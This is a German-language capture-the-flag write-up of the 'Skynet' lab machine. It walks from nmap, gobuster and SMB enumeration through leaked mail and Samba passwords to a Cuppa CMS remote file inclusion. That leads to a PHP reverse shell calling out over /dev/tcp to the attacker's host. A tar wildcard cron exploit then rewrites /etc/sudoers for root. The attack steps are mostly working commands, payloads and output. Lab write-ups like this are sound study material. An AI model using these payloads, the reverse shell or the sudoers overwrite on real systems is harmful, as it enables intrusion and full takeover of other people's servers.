# Ziel: 10.10.17.9
# Scanning
## Nmap 

Output 
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP AUTH-RESP-CODE UIDL RESP-CODES PIPELINING CAPA SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR ID more have LOGINDISABLEDA0001 post-login IMAP4rev1 capabilities IDLE listed LITERAL+ Pre-login LOGIN-REFERRALS OK ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:94:18:10:8C:11 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-10-13T01:55:42-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-13T06:55:42
|_  start_date: N/A


```

-> Intressante Windows Version 6.1 -> Win 7 -> vllt eternal Blue
-> Samba offen -> vllt infos

## Gobuster 

```
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://10.10.17.9/admin/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.17.9/css/]
/js                   (Status: 301) [Size: 305] [--> http://10.10.17.9/js/]
/config               (Status: 301) [Size: 309] [--> http://10.10.17.9/config/]
/ai                   (Status: 301) [Size: 305] [--> http://10.10.17.9/ai/]
/squirrelmail         (Status: 301) [Size: 315] [--> http://10.10.17.9/squirrelmail/]
/server-status        (Status: 403) [Size: 275]

```

-> Webmail unter /squirrelmail
# Enumeration

## Samba 

enum4linux
```
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.17.9
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.17.9    |
 ================================================== 
[+] Got domain/workgroup name: WORKGROUP

 =================================== 
|    Session Check on 10.10.17.9    |
 =================================== 
[+] Server 10.10.17.9 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.17.9    |
 ========================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================== 
|    Users on 10.10.17.9    |
 =========================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]
enum4linux complete on Mon Oct 13 08:18:36 2025

```

Schauen was für ordner anliegen

```
smbclient -L 10.10.17.9

Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

```
Versuch auf "milesdyson" share zuzugreifen ohne erfolg

Zugriff auf "Anonymous". Hier liegen 3 Log Datein die man sich laden kann. Kontrolle dieser, Log1 sieht fast aus wie eine Passwort liste -> vllt login möglich für Webmail

Login via Burp Bruteforcen (ist halt am einfachsten wenn die Liste kurz ist)

## PW und Nutzer Bekannt

milesdyson
cyborg007haloterminator

# Enumeration der Webmails 

-> Durchgehen der Mails 
-> Intressante mail Samba Password Reset
-> PW für Samba share 

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

-> Login auf dem milesdyson samba share 
-> Durchschauen auf Infos -> Important.txt
-> Inhalt: 1. Add features to beta CMS /45kra24zxs28v3yd



# Exploiting erfolglos

-> Verdacht aus NMAP das Eternal Blue vllt Funktionieren könnte 

```
[*] 10.10.17.9:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.17.9:445        - Host does NOT appear vulnerable.
[*] 10.10.17.9:445        - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.17.9:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

# Enumeration 

Da Eternal Blue nicht geklappt hat backtracking zu enumeration von /45kra24zxs28v3yd

-> gefunden /administrator
-> Dahinter liegt admin Portal vonCuppa CMS 
-> Versuch mit bekannten creds anzumelden- Erfolglos 

Schauen ob es vllt was bekanntes zum Exploiten gibt -> Erfolg

```
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                                 | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

# Exploiting 

```

#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

```

http://10.10.17.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

->Test erfolgreich 

Jetzt laden wir uns eine PHP Rev shell 

```
<?php  
/**  
* Plugin Name: Wordpress Reverse Shell  
* Author: azkrath  
*/  
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.17.176/4444 0>&1’”)  
?>
```

und starten einen nc Listener und Python webserver

```
python3 -m http.server
rlwrap nc -lvnp 4444
```

Jetzt müssen wir nur noch die anfrage anpassen

http://10.10.17.9/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.17.176:8000/Desktop/rev.php

und schon erhalten wir die Rev shell
# Privilegien Eskallieren

Checken der Sudo Rechte, SUID und Capability's -> ohne Erfolg 

Checken der Cronjobs -> Interessantes Resultat 

Jede Minute wird /home/milesdyson/backup das backup.sh Script aufgeführt. Beim durchlesen der Shell Datei kann man eine Wildcard sehen welche wir nutzen können 

Das habe ich aber alleine nicht hinbekommen deshalb hier der Lösungsweg aus Writeup

There were multiple methods to get root from this vulnerability, we decided to use it to grant the sudoers permission instead of getting another shell. So, we moved to the directory that is being backed up and then created another shell script by the name of pavan.sh and entered the command inside it using echo. Then we proceeded to enter the checkpoint that will run the shell command when the tar will be backing up the directory. Using the sudo -l command we saw that the sudoers entry has been made. We just use the sudo bash command to get the root shell. We read the root flag to conclude the machine.

```
cd /var/www/html
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
echo "/var/www/html" > "--checkpoint-action=exec=sh pavan.sh"
echo "/var/www/html" > --checkpoint=1
sudo -l
sudo bash
cat /root/root.txt
```